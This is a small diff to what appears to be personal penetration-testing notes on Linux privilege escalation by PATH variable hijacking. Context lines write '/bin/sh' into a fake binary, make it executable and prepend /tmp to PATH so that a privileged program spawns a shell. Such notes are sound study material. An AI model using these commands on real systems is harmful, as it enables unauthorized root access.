@@ -26,7 +26,7 @@
             sys.exit()
 
 ### PRIVESC WITH PATH VARIABLE MANIPULATION
-- If a binary does not detail the path to run another binary e.g not using (/usr/bin/curl)
+- If a binary does not detail the path to run another binary e.g not using (/usr/bin/curl) {stating the path}
 
     ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f0562606-ec66-47bb-a419-9293ca0a62f1)
 
@@ -36,4 +36,6 @@
       echo "/bin/sh" > <binary you eant to attack>
       chmod 700 curl
       export PATH=/tmp:$PATH
-      
+
+   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cf277f1d-1664-4ea8-a1f0-1461101c5006)
+   
